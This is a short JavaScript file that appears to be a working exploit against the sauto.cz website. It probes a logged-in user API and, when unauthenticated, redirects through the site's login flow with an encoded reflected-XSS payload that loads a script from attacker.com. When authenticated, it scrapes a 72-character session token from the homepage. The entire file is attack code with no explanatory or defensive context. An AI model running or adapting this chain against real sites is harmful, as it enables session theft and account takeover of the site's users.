var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        console.log('yes');
        getCookiesFromResponse();
    } else if (this.readyState == 4 && this.status == 401) {
        console.log('no');
        window.location.replace('https://login.szn.cz/continue?return_url=https%3A%2F%2Flogin.sauto.cz%2FloginDone%3Fservice%3Dsauto%26return_url%3Dhttps://www.sauto.cz%2fbannerova-reklama%253FperPage%253D1%2526banner%253D1%2526clickthru%253D%2522%253E%253Cscript%2Bsrc%253D%252F%252Fattacker.com%252Fscript.js%253E%253C%252Fscript%253E%253C%2521--');
    }
};
xhttp.open("GET", "https://www.sauto.cz/api/v1/users/self", true);
xhttp.withCredentials = true;
xhttp.send();

function getCookiesFromResponse() {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            var response = this.responseText;
            var session = response.match(/(?<=ds=).{72}/)[0];
            console.log(session);
        }
    };
    xhttp2.open("GET", "https://www.sauto.cz", true);
    xhttp2.withCredentials = true;
    xhttp2.send();
}